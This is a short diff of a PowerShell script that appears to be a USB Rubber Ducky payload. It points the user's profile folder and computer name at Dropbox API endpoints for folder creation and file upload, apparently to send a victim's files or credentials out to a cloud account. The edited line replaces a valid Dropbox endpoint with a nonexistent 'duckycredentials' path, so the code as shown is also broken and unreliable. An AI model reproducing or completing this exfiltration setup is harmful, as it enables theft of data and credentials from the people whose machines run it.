@@ -3,7 +3,7 @@ $localFolderPath = "$env:USERPROFILE"
 
 $computerName = "$env:COMPUTERNAME"
 $computerNameAsString = $computerName.ToString()
-$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
+$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/duckycredentials"
 
 $dropboxFolderPath = $computerName.ToString()
 $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
